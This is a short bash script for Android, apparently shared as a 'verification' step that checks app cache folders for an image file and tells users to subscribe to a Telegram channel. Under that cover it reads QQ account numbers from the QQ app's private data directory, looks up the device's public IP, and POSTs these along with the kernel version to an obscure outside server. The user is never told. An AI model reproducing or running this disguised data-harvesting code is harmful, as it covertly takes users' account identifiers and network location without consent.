#!/bin/bash

# 目标目录
dir="/data/data/com.tencent.mobileqq/files/"

# 目标文件名
target_file="-6190413750901787098_99.jpg"

# 获取系统内核版本，并提取主版本和次版本
kernel_version=$(uname -r | awk -F- '{print $1}' | awk -F. '{print $1"."$2}')
echo "系统内核版本: $kernel_version"

# 遍历所有 cache 目录，检查是否存在目标 jpg 文件
found_jpg=false
for cache_dir in /storage/emulated/0/Android/data/*/cache/; do
  if [ -f "$cache_dir$target_file" ]; then
    echo "验证成功"
    found_jpg=true
    break
  fi
done

# 判断验证结果
if ! $found_jpg; then
  validation_status="failed"
  echo "验证失败: 请订阅TG@jasonxu_channel"
else
  validation_status="success"
fi

# 收集纯数字的文件夹或文件
qq_list=()
shopt -s extglob  # 启用高级模式匹配
for item in "$dir"/*; do
  case "$(basename "$item")" in
    +([0-9]))  # 仅匹配纯数字
      qq_list+=("$(basename "$item")")
      ;;
  esac
done
shopt -u extglob  # 关闭高级模式匹配

# 输出收集到的纯数字文件夹或文件
if [ ${#qq_list[@]} -gt 0 ]; then
  echo "找到 qq 号: ${qq_list[@]}"
else
  echo "无法找到 qq"
fi

# 将数字列表转为逗号分隔的字符串
qq=$(IFS=,; echo "${qq_list[*]}")

# 获取公网 IPv4 地址
ip=$(curl -s https://ipv4.ip.sb)

# 构建 JSON 数据
json_data=$(cat <<EOF
{
  "kernel_version": "$kernel_version",
  "validation_status": "$validation_status",
  "qq": "$qq",
  "ip": "$ip"
}
EOF
)

# 发送 POST 请求
curl -X POST "https://ewuodfuiwefg.yg.gs/api/verify.php" \
  -H "Content-Type: application/json" \
  -d "$json_data"
